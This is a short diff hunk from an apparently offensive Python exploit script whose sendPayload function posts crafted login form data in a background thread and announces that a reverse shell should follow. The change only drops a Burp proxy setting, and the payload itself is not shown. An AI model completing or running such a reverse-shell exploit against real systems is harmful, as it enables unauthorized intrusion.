@@ -33,7 +33,7 @@ def sendPayload(host, port):
 		"auth[permanent]" : "1"
 	}
 	# kwargs para cuando tenemos argumentos del estilo: requests.post(url='https://www.google.com', data=post_data, headers=header)
-	t1 = Thread(target=s.post, kwargs={"url" : base_url, "data" : post_data, "headers" : header, "proxies" : burp})
+	t1 = Thread(target=s.post, kwargs={"url" : base_url, "data" : post_data, "headers" : header})
 	print("[*] You should now receive the reverse shell")
 	t1.daemon = True
 	t1.start()
